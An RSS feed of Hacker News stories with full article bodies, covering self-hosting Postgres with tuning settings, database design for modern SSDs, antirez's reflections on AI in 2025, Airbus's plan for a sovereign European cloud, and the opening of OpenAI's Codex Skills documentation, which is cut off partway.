<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sat, 20 Dec 2025 17:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Go ahead, self-host Postgres (154 pts)]]></title>
            <link>https://pierce.dev/notes/go-ahead-self-host-postgres#user-content-fn-1</link>
            <guid>46336947</guid>
            <pubDate>Sat, 20 Dec 2025 15:43:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pierce.dev/notes/go-ahead-self-host-postgres#user-content-fn-1">https://pierce.dev/notes/go-ahead-self-host-postgres#user-content-fn-1</a>, See on <a href="https://news.ycombinator.com/item?id=46336947">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Self-hosting a database sounds terrifying. That narrative has certainly been pushed over the last 10 years by the big cloud providers:</p>
<ul>
<li>Hosting your own database is dangerous</li>
<li>How are you going to get all the 9s of reliability doing it yourself?</li>
<li>You'll have access to dedicated database engineers that you couldn't (or wouldn't want to) hire yourself</li>
</ul>
<p>The rumors obscure the truth.</p>
<ul>
<li>Most cloud hosts are just running a slightly modified version of the open source Postgres server anyway<sup><a href="#user-content-fn-1" id="user-content-fnref-1" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup></li>
<li>Database engineering is not a silver bullet if your queries are sub-optimal. Abstracting away your engine too much from your code doesn't let you benchmark what's going on and work around the otherwise reasonable constraints of how the engine is actually querying your code.</li>
</ul>
<p>I've had data corruption when using a 3rd party vendor just the same as I've had when self-hosting. And with a serious markup, what's the point?</p>
<p>I've been running my own self-hosted postgres for the better part of two years now, serving thousands of users and tens of millions of queries daily<sup><a href="#user-content-fn-5" id="user-content-fnref-5" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>. I expected it would give me much more trouble than it has. It's caused me exactly 30mins of stress during a manual migration and that's all. Aside from that it's been fast, stable, and much cheaper.</p>
<p>I sleep just fine at night thank you.</p>
<h2 id="blue-skies-and-the-white-cloud">Blue skies and the white cloud</h2>
<p>Let me rewind for a second. The "database as a service" narrative wasn't always the dominant one. From the 80s to the early 2000s, everyone ran their own databases because there wasn't really an alternative. You had your application server and your database server, often on the same physical machine. It was pretty dang fast<sup><a href="#user-content-fn-6" id="user-content-fnref-6" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup> because it was communicating over localhost before forwarding the final payload over the network.</p>
<p>Amazon launched RDS in 2009. The pitch was compelling: we'll handle backups, patching, high availability, and monitoring. You just connect and go. The early pricing was reasonable too - a small RDS instance cost about the same as a dedicated server, but with less operational overhead. If you had to scale your database specs independent from your web service, it made some sense.</p>
<p>The real shift happened around 2015 when cloud adoption accelerated. Companies started to view <em>any</em> infrastructure management as "undifferentiated heavy lifting"<sup><a href="#user-content-fn-2" id="user-content-fnref-2" data-footnote-ref="true" aria-describedby="footnote-label">4</a></sup>. Running your own database became associated with legacy thinking. The new orthodoxy emerged: focus on your application logic, let AWS handle the infrastructure.</p>
<p>Fast forward to 2025 and I hope the pendulum might be swinging back. RDS pricing has grown considerably more aggressive. A db.r6g.xlarge instance (4 vCPUs, 32GB RAM) now costs $328/month before you add storage, backups, or multi-AZ deployment. For that price, you could rent a dedicated server with 32 cores and 256GB of RAM.</p>
<h2 id="unpacking-the-cloud">Unpacking the cloud</h2>
<p>For the most part managed database services aren't running some magical proprietary technology. They're just running the same open-source Postgres you can download with some operational tooling wrapped around it.</p>
<p>Take AWS RDS. Under the hood, it's:</p>
<ul>
<li>Standard Postgres compiled with some AWS-specific monitoring hooks</li>
<li>A custom backup system using EBS <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_WorkingWithAutomatedBackups.html" data-snapshot-id="4196c4ad50694776e515625faa7c1dc1" data-snapshot-url="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_WorkingWithAutomatedBackups.html" data-snapshot-date="2025-07-02T08:55:01.569843">snapshots</a></li>
<li>Automated configuration management via Chef/Puppet/Ansible</li>
<li>Load balancers and connection pooling (PgBouncer)</li>
<li>Monitoring integration with CloudWatch</li>
<li>Automated failover scripting</li>
</ul>
<p>None of this is technically complex. The value proposition is operational: they handle the monitoring, alerting, backup verification, and incident response. It's also a production ready configuration at minute zero of your first deployment. But the actual database engine? It's the same Postgres running the same SQL queries with the same performance characteristics.</p>
<p>I helped proved this to myself when I migrated off RDS. I took a <code>pg_dump</code> of my RDS instance, restored it to a self-hosted server with identical specs, and ran my application's test suite. Performance was identical. In some cases, it was actually better because I could tune parameters that RDS locks down.</p>
<h2 id="my-self-hosting-journey">My self-hosting journey</h2>
<p>I spent a weekend migrating to a dedicated server from DigitalOcean<sup><a href="#user-content-fn-3" id="user-content-fnref-3" data-footnote-ref="true" aria-describedby="footnote-label">5</a></sup>: 16 vCPU / 32GB Memory / 400GB disk. The migration took about 4 hours of actual work:</p>
<ol>
<li>Hour 1: Provision server, install Postgres, configure basic settings (kamal makes this pretty easy)</li>
<li>Hour 2: Set up monitoring (Prometheus + Grafana), configure backups</li>
<li>Hour 3: Migrate data using <code>pg_dump</code> and <code>pg_restore</code></li>
<li>Hour 4: Update application connection strings, verify everything works</li>
</ol>
<p>The performance improvement was immediate. Query latency dropped by about 20% across the board. Why? Because I could tune the configuration for my specific workload instead of using RDS's conservative defaults.</p>
<h2 id="the-real-operational-complexity">The real operational complexity</h2>
<p>For my companies with high availability requirements, this stack takes me about half an hour per month. For the stacks that get less traffic I'm fully hands off - set it and forget it. This is roughly my cadence for my primary deploys:</p>
<p><strong>Weekly tasks</strong> (10 minutes):</p>
<ul>
<li>Check backup verification (automated, just reviewing alerts)</li>
<li>Review slow query logs</li>
<li>Check disk space trends</li>
</ul>
<p><strong>Monthly tasks</strong> (30 minutes):</p>
<ul>
<li>Apply Postgres security updates</li>
<li>Review and rotate backup retention</li>
<li>Capacity planning based on growth trends</li>
</ul>
<p><strong>Quarterly tasks (optional)</strong> (2 hours):</p>
<ul>
<li>Update monitoring dashboards</li>
<li>Review and optimize configuration parameters</li>
<li>Test disaster recovery procedures</li>
</ul>
<p>As far as I'm concerned this is roughly comparable to the time you spend debugging RDS connection limits, working around parameter groups you can't modify, or dealing with surprise maintenance windows.</p>
<p>The main operational difference is that you're responsible for incident response. If your database goes down at 3 AM, you need to fix it. But here's the thing: RDS goes down too<sup><a href="#user-content-fn-4" id="user-content-fnref-4" data-footnote-ref="true" aria-describedby="footnote-label">6</a></sup>. And when it does, you're still the one getting paged, you just have fewer tools to fix the problem.</p>
<p>For the most part I've found that unless I'm actively messing with the database, it's really stable. After all you're just renting some remote machine in a data center somewhere. All updates are up to you - so you have a good idea when to schedule the most risky windows.</p>
<h2 id="when-self-hosting-makes-sense">When self-hosting makes sense</h2>
<p>I'd argue self-hosting is the right choice for <em>basically</em> everyone, with the few exceptions at both ends of the extreme:</p>
<ol>
<li>If you're just starting out in software &amp; want to get something working quickly with vibe coding, it's easier to treat Postgres as just another remote API that you can call from your single deployed app</li>
<li>If you're a <em>really</em> big company and are reaching the scale where you need trained database engineers to just work on your stack, you might get economies of scale by just outsourcing that work to a cloud company that has guaranteed talent in that area. The second full freight salaries come into play, outsourcing looks a bit cheaper.</li>
<li>Regulated workloads (PCI-DSS, FedRAMP, HIPAA, etc.) sometimes require a managed platform with signed BAAs or explicit compliance attestations.</li>
</ol>
<h2 id="the-configuration-deep-dive">The configuration deep dive</h2>
<p>The things you really have to bear in mind when self-hosting:</p>
<p><strong>Memory Configuration</strong>: This is where most people mess up. Pulling the standard <code>postgres</code> docker image won't cut it. You have to configure memory bounds with static limits that correspond to hardware. I've <a href="https://github.com/piercefreeman/autopg" data-snapshot-id="b9fb9b474ce6673169887d1102a3e4bf" data-snapshot-url="https://github.com/piercefreeman/autopg" data-snapshot-date="2025-07-02T07:58:54.204846">automated</a> some of these configurations. But whether you do it manually or use some auto-config, tweaking these params is a must.</p>
<p>The key parameters:</p>
<ul>
<li><code>shared_buffers</code>: Start around 25 % of RAM; modern PG happily uses tens of GB.</li>
<li><code>effective_cache_size</code>: Set to 75% of system RAM (this tells Postgres how much memory the OS will use for caching)</li>
<li><code>work_mem</code>: Be conservative here. Set it to total RAM / max_connections / 2, or use a fixed value like 32MB</li>
<li><code>maintenance_work_mem</code>: Can be generous (1-2GB), only used during VACUUM and index operations</li>
</ul>
<p><strong>Connection Management</strong>: RDS enforces their own max connections, but when self hosting you get the opportunity to choose your own:</p>
<pre><code># Connection settings
max_connections = 200
shared_preload_libraries = 'pg_stat_statements'
log_connections = on
log_disconnections = on
</code></pre>
<p>Wahoo! More connections = more parallelism right?</p>
<p>No such free lunch I'm afraid. Making fresh connections in postgres has pretty expensive overhead, so you almost always want to put a load balancer on front of it. I'm using pgbouncer on all my projects by default - even when load might not call for it. Python asyncio applications just work better with a centralized connection pooler.</p>
<p>And yes, I've <a href="https://github.com/piercefreeman/autopg/tree/main/autopgpool" data-snapshot-id="023f5303f782c2b4c1bfd977bb401765" data-snapshot-url="https://github.com/piercefreeman/autopg/tree/main/autopgpool" data-snapshot-date="2025-07-02T08:25:51.770693">automated</a> some of the config there too.</p>
<p><strong>Storage Tuning</strong>: NVMe SSDs change the performance equation completely:</p>
<pre><code># Storage optimization for NVMe
random_page_cost = 1.1                 # Down from default 4.0
seq_page_cost = 1.0                    # Keep at default
effective_io_concurrency = 200         # Up from default 1
</code></pre>
<p>These settings tell Postgres that random reads are almost as fast as sequential reads on NVMe drives, which dramatically improves query planning.</p>
<p><strong>WAL Configuration</strong>: Write-Ahead Logging is critical for durability and performance:</p>
<pre><code># WAL settings
wal_level = replica                     # Enable streaming replication
max_wal_size = 2GB                     # Allow larger checkpoints
min_wal_size = 1GB                     # Prevent excessive recycling
checkpoint_completion_target = 0.9      # Spread checkpoint I/O over 90% of interval
</code></pre>
<h2 id="conclusion">Conclusion</h2>
<p>I'm not advocating that everyone should self-host everything. But the pendulum has swung too far toward managed services. There's a large sweet spot where self-hosting makes perfect sense, and more teams should seriously consider it.</p>
<p>Start small. If you're paying more than $200/month for RDS, spin up a test server and migrate a non-critical database. You might be surprised by how straightforward it is.</p>
<p>The future of infrastructure is almost certainly more hybrid than it's been recently: managed services where they add genuine value, self-hosted where they're just expensive abstractions. Postgres often falls into the latter category.</p>
<section data-footnotes="true">
<ol>
<li id="user-content-fn-1">
<p>They're either just hosting a vanilla postgres instance that's tied to the deployed hardware config, or doing something opaque with edge deploys and sharding. In the latter case they near guarantee your DB will stay highly available but costs can quickly spiral out of control. <a href="#user-content-fnref-1" data-footnote-backref="" aria-label="Back to reference 1">↩</a></p>
</li>
<li id="user-content-fn-5">
<p>Maybe up to billions at this point. <a href="#user-content-fnref-5" data-footnote-backref="" aria-label="Back to reference 2">↩</a></p>
</li>
<li id="user-content-fn-6">
<p>Even on otherwise absolutely snail speed hardware. <a href="#user-content-fnref-6" data-footnote-backref="" aria-label="Back to reference 3">↩</a></p>
</li>
<li id="user-content-fn-2">
<p>This was Jeff Bezos's favorite phrase during the early AWS days, and it stuck. <a href="#user-content-fnref-2" data-footnote-backref="" aria-label="Back to reference 4">↩</a></p>
</li>
<li id="user-content-fn-3">
<p>Similar options include OVH, Hetzner dedicated instances, or even bare metal from providers like Equinix. <a href="#user-content-fnref-3" data-footnote-backref="" aria-label="Back to reference 5">↩</a></p>
</li>
<li id="user-content-fn-4">
<p>AWS RDS &amp; S3 has had several major outages over the years. The most memorable was the 2017 US-East-1 outage that took down half the internet. <a href="#user-content-fnref-4" data-footnote-backref="" aria-label="Back to reference 6">↩</a></p>
</li>
</ol>
</section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What Does a Database for SSDs Look Like? (108 pts)]]></title>
            <link>https://brooker.co.za/blog/2025/12/15/database-for-ssd.html</link>
            <guid>46334990</guid>
            <pubDate>Sat, 20 Dec 2025 10:13:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://brooker.co.za/blog/2025/12/15/database-for-ssd.html">https://brooker.co.za/blog/2025/12/15/database-for-ssd.html</a>, See on <a href="https://news.ycombinator.com/item?id=46334990">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post">






<p>Maybe not what you think.</p>

<p>Over on X, <a href="https://x.com/BenjDicken/status/2000197741478384029">Ben Dicken asked</a>:</p>

<blockquote>
  <p>What does a relational database designed <em>specifically</em> for local SSDs look like?
Postgres, MySQL, SQLite and many others were invented in the 90s and 00s, the era of spinning disks. A local NVMe SSD has ~1000x improvement in both throughput and latency.
Design decisions like write-ahead logs, large page sizes, and buffering table writes in bulk were built around disks where I/O was SLOW, and where sequential I/O was order(s)-of-magnitude faster than random.
If we had to throw these databases away and begin from scratch in 2025, what would change and what would remain?</p>
</blockquote>

<p>How might we tackle this question quantitatively for the modern transaction-orientated database?</p>

<p>But first, the bigger picture. It’s not only SSDs that have come along since databases like Postgres were first designed. We also have the cloud, with deployments to excellent datacenter infrastructure, including multiple independent datacenters with great network connectivity between them, available to all. Datacenter networks offer 1000x (or more) increased throughput, along with latency in the microseconds. Servers with hundreds of cores and thousands of gigabytes of RAM are mainstream.</p>

<p>Applications have changed too. Companies are global, businesses are 24/7. Down time is expensive, and that expense can be measured. The security and compliance environment is much more demanding. Builders want to deploy in seconds, not days.</p>

<p><strong>Approach One: The Five Minute Rule</strong></p>

<p>Perhaps my single favorite systems paper, <a href="https://dsf.berkeley.edu/cs286/papers/fiveminute-tr1986.pdf">The 5 Minute Rule…</a> by Jim Gray and Franco Putzolu gives us a very simple way to answer one of the most important questions in systems: how big should caches be? The five minute rule is that, back in 1986, if you expected to read a page again within five minutes you should keep in in RAM. If not, you should keep it on disk. The basic logic is that you look at the page that’s least likely to be re-used. If it’s cheaper to keep around until it’s next expected re-use, then you should keep more. If it’s cheaper to reload from storage than keep around, then you should keep less<sup><a href="#foot1">1</a></sup>. Let’s update the numbers for 2025, assuming that pages are around 32kB<sup><a href="#foot2">2</a></sup> (this becomes important later).</p>

<p>The EC2 <code>i8g.48xlarge</code> <a href="https://docs.aws.amazon.com/ec2/latest/instancetypes/so.html">delivers about 1.8 million</a> read iops of this size, at a price of around $0.004576 per second, or \(10^{-9}\) dollars per transfer (assuming we’re allocating about 40% of the instance price to storage). About one dollar per billion reads. It also has enough RAM for about 50 million pages of this size, costing around \(3 \times 10^{-11}\) dollars to storage a page for one second.</p>

<p>So, on this instance type, we should size our RAM cache to store pages for about 30 seconds. Not too different from Gray and Putzolu’s result 40 years ago!</p>

<p>That’s answer number one: the database should have a cache sized so that the hot set contains pages expected to be accessed in the next 30 seconds, for optimal cost. For optimal latency, however, the cache may want to be considerably bigger.</p>

<p><strong>Approach Two: The Throughput/IOPS Breakeven Point</strong></p>

<p>The next question is what size accesses we want to send to our storage devices to take best advantage of their performance. In the days of spinning media, the answer to this was surprisingly big: a 100MB/s disk could generally do around 100 seeks a second, so if your transfers were less than around 1MB you were walking away from throughput. Give or take a factor of 2. What does it look like for modern SSDs?</p>

<p>SSDs are much faster on both throughput and iops. They’re less sensitive than spinning drives to workload patterns, but read/write ratios and the fullness of the drives still matter. Absent benchmarking on the actual hardware with the real workload, my <a href="https://brooker.co.za/blog/2022/12/15/thumb.html">rule of thumb</a> is that SSDs are throughput limited for transfers bigger than 32kB, and iops limited for transfers smaller than 32kB.</p>

<p>Making transfers bigger than 32kB doesn’t help throughput much, reduces IOPS, and probably makes the cache less effective because of <a href="https://en.wikipedia.org/wiki/False_sharing">false sharing</a> and related effects. This is especially important for workloads with poor <a href="https://brooker.co.za/blog/2025/10/22/uuidv7.html">spatial locality</a>.</p>

<p>So that’s answer number two: we want our transfers to disk not to be much smaller than 32kB on average, or we’re walking away from throughput.</p>

<p><strong>Approach Three: Durability and Replication</strong></p>

<p>Building reads on local SSDs is great: tons of throughput, tons of iops. Writes on local SSDs, on the other hand, have the distinct problem of only being durable on the local box, which is unacceptable for most workloads. Modern hardware is very reliable, but thinking through the business risks of losing data on failover isn’t very fun at all, so let’s assume that our modern database is going to replicate off-box, making at least one more synchronous copy. Ideally in a different availability zone (AZ).</p>

<p>That <code>i8g.48xlarge</code> we were using for our comparison earlier has 100Gb/s (or around 12GB/s) of network bandwidth. That puts a cap on how much write throughput we can have for a single-leader database. Cross-AZ latency in EC2 varies from a couple hundred microseconds to a millisecond or two, which puts a minimum on our commit latency.</p>

<p>That gives us answer number three: we want to incur cross-AZ latency only at commit time, and not during writes.</p>

<p>Which is where we run into one of my favorite topics: isolation. The <em>I</em> in <em>ACID</em>. A modern database design will avoid read-time coordination using multiversioning, but to offer isolation stronger than <code>READ COMMITTED</code> will need to coordinate either on each write or at commit time. It can do that like, say, Aurora Postgres does, having a single leader at a time running in a single AZ. This means great latency for clients in that zone, and higher latency for clients in different AZs. Given that most applications are hosted in multiple AZs, this can add up for latency-sensitive applications which makes a lot of round trips to the database. The alternative approach is the one Aurora DSQL takes, doing the cross-AZ round trip only at <code>COMMIT</code> time, saving round-trips.</p>

<p>Here’s me talking about the shape of that trade-off at re:Invent this year:</p>

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/SNnUpYvBfow?si=hRTXS5kyHtyXW7zB&amp;start=3260" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<p>There’s no clear answer here, because there are real trade-offs between the two approaches. But do make sure to ask your database vendor whether those impressive latency benchmarks are running where you application actually runs. In the spirit of the original question, though, the incredible bandwidth and latency availability in modern datacenter networks is as transformative as SSDs in database designs. Or should be.</p>

<p>While we’re incurring the latency cost of synchronous replication, we may as well get <a href="https://brooker.co.za/blog/2025/11/18/consistency.html">strongly consistent</a> scale-out reads for free. In DSQL, we do this using high-quality hardware clocks that <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/set-time.html">you can use too</a>. Another nice win from modern hardware. There are other approaches too.</p>

<p>That’s answer number four for me: The modern database uses high-quality clocks and knowledge of actual application architectures to optimize for real-world performance (like latency in multiple availability zones or regions) without compromising on strong consistency.</p>

<p><strong>Approach Four: What about that WAL?</strong></p>

<blockquote>
  <p>Design decisions like write-ahead logs, large page sizes, and buffering table writes in bulk were built around disks where I/O was SLOW, and where sequential I/O was order(s)-of-magnitude faster than random.</p>
</blockquote>

<p>WALs, and related low-level logging details, are critical for database systems that care deeply about durability on a single system. But the modern database isn’t like that: it doesn’t depend on commit-to-disk on a single system for its durability story. Commit-to-disk on a single system is both unnecessary (because we can replicate across storage on multiple systems) and inadequate (because we don’t want to lose writes even if a single system fails).</p>

<p>That’s answer number five: the modern database commits transactions to a distributed log, which provides multi-machine multi-AZ durability, and might provide other services like atomicity. Recovery is a replay from the distributed log, on any one of a number of peer replicas.</p>

<p><strong>What About Data Structures?</strong></p>

<p>B-Trees versus LSM-trees vs B-Tree variants versus LSM variants versus other data structures are trade-offs that have a lot to do with access patterns and workload patterns. Picking a winner would be a whole series of blog posts, so I’m going to chicken out and say <em>its complicated</em>.</p>

<p><strong>Conclusion</strong></p>

<blockquote>
  <p>If we had to throw these databases away and begin from scratch in 2025, what would change and what would remain?</p>
</blockquote>

<p>I’d keep the relational model, atomicity, isolation (but would probably pick <code>SNAPSHOT</code> as a default), strong consistency, SQL, interactive transactions, and the other core design decisions of relational databases. But I’d move durability, read and write scale, and high availability into being distributed rather than single system concerns. I think that helps with performance and cost, while making these properties easier to achieve. I’d mostly toss out local durability and recovery, and all the huge history of optimizations and data structures around that<sup><a href="#foot3">3</a></sup>, in favor of getting better properties in the distributed setting. I’d pay more attention to internal strong isolation (in the security sense) between clients and workloads. I’d size caches for a <a href="https://denninginstitute.com/pjd/PUBS/WSModel_1968.pdf">working set</a> of between 30 seconds and 5 minutes of accesses. I’d optimize for read transfers around that 32kB sweet spot from local SSD, and the around 8kB sweet spot for networks.</p>

<p>Probably more stuff too, but this is long enough as-is.</p>

<p>Other topics worth covering include avoiding copies on IO, co-design with virtualization (e.g. <a href="https://www.amazon.science/publications/resource-management-in-aurora-serverless">see our Aurora Serverless paper</a>), trade-offs of batching, how the relative performance of different isolation levels changes, what promises to give clients, encryption and authorization of data at rest and in motion, dealing with very hot single items, new workloads like vector, verifiable replication journals, handing off changes to analytics systems, access control, multi-tenancy, forking and merging, and even locales.</p>

<p><em>Footnotes</em></p>

<ol>
  <li><a name="foot1"></a> The reasoning is slightly smarter, thinking about the <em>marginal</em> page and <em>marginal</em> cost of memory, but this simplification works for our purposes here. The <em>marginal</em> cost of memory is particularly interesting in a provisioned system, because it varies between zero (you’ve paid for it already) and huge (you need a bigger instance size). One of the really nice things about serverless (like DSQL) and dynamic scaling (like Aurora Serverless) is that it makes the marginal cost constant, greatly simplifying the task of reasoning about cache size.</li>
  <li><a name="foot2"></a> Yes, I know that pages are typically 4kB or 2MB, but bear with me here.</li>
  <li><a name="foot3"></a> Sorry <a href="https://web.stanford.edu/class/cs345d-01/rl/aries.pdf">ARIES</a>.</li>
</ol>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reflections on AI at the End of 2025 (117 pts)]]></title>
            <link>https://antirez.com/news/157</link>
            <guid>46334819</guid>
            <pubDate>Sat, 20 Dec 2025 09:38:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://antirez.com/news/157">https://antirez.com/news/157</a>, See on <a href="https://news.ycombinator.com/item?id=46334819">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
<section id="newslist"><article data-news-id="157"></article></section><topcomment><article data-comment-id="157-" id="157-"><span><span><a href="https://antirez.com/user/antirez">antirez</a></span> 7 hours ago. 24344 views.  </span><pre>* For years, despite functional evidence and scientific hints accumulating, certain AI researchers continued to claim LLMs were stochastic parrots: probabilistic machines that would: 1. NOT have any representation about the meaning of the prompt. 2. NOT have any representation about what they were going to say. In 2025 finally almost everybody stopped saying so.

* Chain of thought is now a fundamental way to improve LLM output. But, what is CoT? Why it improves output? I believe it is two things: 1. Sampling in the model representations (that is, a form of internal search). After information and concepts relevant to the prompt topic is in the context window, the model can better reply. 2. But if you mix this to reinforcement learning, the model also learns to put one token after the other (each token will change the model state) in order to converge to some useful reply.

* The idea that scaling is limited to the number of tokens we have, is no longer true, because of reinforcement learning with verifiable rewards. We are still not at AlphaGo move 37 moment, but is this really impossible in the future? There are certain tasks, like improving a given program for speed, for instance, where in theory the model can continue to make progress with a very clear reward signal for a very long time. I believe improvements to RL applied to LLMs will be the next big thing in AI.

* Programmers resistance to AI assisted programming has lowered considerably. Even if LLMs make mistakes, the ability of LLMs to deliver useful code and hints improved to the point most skeptics started to use LLMs anyway: now the return on the investment is acceptable for many more folks. The programming world is still split among who uses LLMs as colleagues (for instance, all my interaction is via the web interface of Gemini, Claude, …), and who uses LLMs as independent coding agents.

* A few well known AI scientists believe that what happened with Transformers can happen again, and better, following different paths, and started to create teams, companies to investigate alternatives to Transformers and models with explicit symbolic representations or world models. I believe that LLMs are differentiable machine trained on a space able to approximate discrete reasoning steps, and it is not impossible they get us to AGI even without fundamentally new paradigms appearing. It is likely that AGI can be reached independently with many radically different architectures.

* There is who says chain of thought changed LLMs nature fundamentally, and this is why they, in the past, claimed LLMs were very limited, and now are changing their mind. They say, because of CoT, LLMs are now a different thing. They are lying. It is still the same architecture with the same next token target, and the CoT is created exactly like that, token after token.

* The ARC test today looks a lot less insurmountable than initially thought: there are small models optimized for the task at hand that perform decently well on ARC-AGI-1, and very large LLMs with extensive CoT achieving impressive results on ARC-AGI-2 with an architecture that, according to many folks, would not deliver such results. ARC, in some way, transitioned from being the anti-LLM test to a validation of LLMs.

* The fundamental challenge in AI for the next 20 years is avoiding extinction.</pre></article></topcomment>


<p><a href="https://disqus.com/">blog comments powered by <span>Disqus</span></a>

</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Airbus to migrate critical apps to a sovereign Euro cloud (344 pts)]]></title>
            <link>https://www.theregister.com/2025/12/19/airbus_sovereign_cloud/</link>
            <guid>46334533</guid>
            <pubDate>Sat, 20 Dec 2025 08:36:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2025/12/19/airbus_sovereign_cloud/">https://www.theregister.com/2025/12/19/airbus_sovereign_cloud/</a>, See on <a href="https://news.ycombinator.com/item?id=46334533">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p><span>Exclusive</span> Airbus is preparing to tender a major contract to migrate mission-critical workloads to a digitally sovereign European cloud – but estimates only an 80/20 chance of finding a suitable provider.</p>
<div><p><img src="https://regmedia.co.uk/2016/11/25/airbus_a350_1000.jpg?x=174&amp;amp;y=115&amp;amp;crop=1" width="174" height="115" alt="Airbus A350-1000"></p><h2 title="Google Workspace switch drags on amid Excel dependencies, compliance requirements, and compatibility issues">Seven years later, Airbus is still trying to kick its Microsoft habit</h2>
<p><a href="https://www.theregister.com/2025/11/26/microsoft_airbus_migration/"><span>READ MORE</span></a></p></div>
<p>The aerospace manufacturer, which has already consolidated its datacenter estate and uses services like Google Workspace, now wants to move key on-premises applications including ERP, manufacturing execution systems, CRM, and product lifecycle management (aircraft designs) to the cloud.</p>
<p>"I need a sovereign cloud because part of the information is extremely sensitive from a national and European perspective," Catherine Jestin, Airbus's executive vice president of digital, told <em>The Register</em>. "We want to ensure this information remains under European control."</p>
<p>The driver is access to new software. Vendors like <a target="_blank" href="https://www.theregister.com/2023/08/03/sap_ceo_push_for_cloudonly/">SAP are developing innovations exclusively in the cloud</a>, pushing customers toward platforms like S/4HANA.</p>
<p>The request for proposals launches in early January, with a decision expected before summer. The contract – understood to be worth more than €50 million – will be long term (up to ten years), with price predictability over the period.</p>

    

<p>Digital sovereignty has become more critical since Donald Trump's return to the White House in January. His policies created <a target="_blank" href="https://www.theregister.com/2025/04/30/microsoft_getting_nervous_about_europes/">volatility in trade and geopolitical relations</a>, prompting <a target="_blank" href="https://www.theregister.com/2025/03/17/european_tech_sovereign_fund/">European customers to reduce reliance on US providers</a>.</p>

        


        

<p>While <a target="_blank" href="https://www.theregister.com/2025/11/07/microsoft_announces_strengthening_of_sovereignty/">Microsoft</a>, <a target="_blank" href="https://www.theregister.com/2025/06/03/aws_european_sovereign_cloud/">AWS</a>, and <a target="_blank" href="https://www.theregister.com/2025/05/21/google_sovereign_cloud_updates/">Google</a> have created solutions to address these concerns, fears persist about the US CLOUD Act, which allows authorities to request data held by American corporations in overseas datacenters.</p>
<ul>

<li><a href="https://www.theregister.com/2025/11/27/canada_court_ovh/">Canadian data order risks blowing a hole in EU sovereignty</a></li>

<li><a href="https://www.theregister.com/2025/11/24/nato_google_cloud/">NATO taps Google for air-gapped sovereign cloud</a></li>

<li><a href="https://www.theregister.com/2025/11/19/microsoft_sap_cloud_crisis/">Microsoft-SAP pact aims to keep Euro cloud running in a crisis</a></li>

<li><a href="https://www.theregister.com/2025/11/10/three_most_important_factors_in/">Big Tech's control freak era is breaking itself apart</a></li>
</ul>
<p>Microsoft admitted in French court last July it <a target="_blank" href="https://www.theregister.com/2025/07/25/microsoft_admits_it_cannot_guarantee/">couldn't guarantee data sovereignty</a> under this legislation.</p>
<p>Jestin is waiting for European regulators to clarify whether Airbus would truly be "immune to extraterritorial laws" – and whether services could be interrupted.</p>
<div><p><img src="https://regmedia.co.uk/2020/12/21/shutterstock_cloud_migration.jpg?x=174&amp;amp;y=115&amp;amp;crop=1" width="174" height="115" alt="Cloud migration"></p><h2 title="Aerospace giant faces 'massive work' to move legacy ERP systems to S/4HANA as support deadline looms">Airbus exec: Most CIOs in Europe will not finish SAP ECC6 migration by 2030</h2>
<p><a href="https://www.theregister.com/2025/12/11/airbus_exec_sap/"><span>READ MORE</span></a></p></div>
<p>The concern isn't theoretical. Chief Prosecutor of the International Criminal Court (ICC) Karim Khan reportedly <a target="_blank" href="https://www.theregister.com/2025/10/31/international_criminal_court_ditches_office/">lost access to his Microsoft email</a> after Trump sanctioned him for criticizing Israeli PM Benjamin Netanyahu, though Microsoft denies suspending ICC services.</p>
<p>Beyond US complications, Jestin questions whether European cloud providers have sufficient scale. "If you asked me today if we'll find a solution, I'd say 80/20."</p>
<p>This puts pressure on European providers to collaborate, though whether they can navigate such complexities in Airbus's timeframe remains uncertain. ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Skills Officially Comes to Codex (159 pts)]]></title>
            <link>https://developers.openai.com/codex/skills/</link>
            <guid>46334424</guid>
            <pubDate>Sat, 20 Dec 2025 08:09:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://developers.openai.com/codex/skills/">https://developers.openai.com/codex/skills/</a>, See on <a href="https://news.ycombinator.com/item?id=46334424">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="mainContent"> <p>Agent Skills let you extend Codex with task-specific capabilities. A skill packages instructions, resources, and optional scripts so Codex can perform a specific workflow reliably. You can share skills across teams or the community, and they build on the <a href="http://agentskills.io/">open Agent Skills standard</a>.</p>
<p>Skills are available in both the Codex CLI and IDE extensions.</p>

<p>A skill captures a capability expressed through markdown instructions inside a <code>SKILL.md</code> file accompanied by optional scripts, resources, and assets that Codex uses to perform a specific task.</p>
